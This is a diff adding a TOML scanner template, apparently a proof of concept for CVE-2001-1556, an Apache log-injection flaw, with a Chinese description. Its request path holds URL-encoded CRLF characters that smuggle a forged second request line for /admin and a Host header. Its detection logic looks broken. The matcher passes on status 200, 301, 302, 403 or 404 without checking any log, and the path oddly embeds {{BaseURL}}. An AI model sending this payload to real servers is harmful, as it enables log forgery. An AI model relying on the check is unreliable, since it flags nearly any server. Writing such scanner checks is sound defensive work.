@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "检测Apache HTTP Server日志注入漏洞，通过发送包含CRLF控制字符的HTTP请求，验证服务器是否记录未过滤的换行符，导致日志伪造"
+id = "POC-AVE-2001-0541"
+name = "CVE-2001-1556 PoC"
+severity = "medium"
+tags = ["cve-2001-1556"]
+vuln_id = [
+    "CVE-2001-1556",
+    "AVE-2001-0541",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    301,
+    302,
+    403,
+    404,
+]
+type = "status"
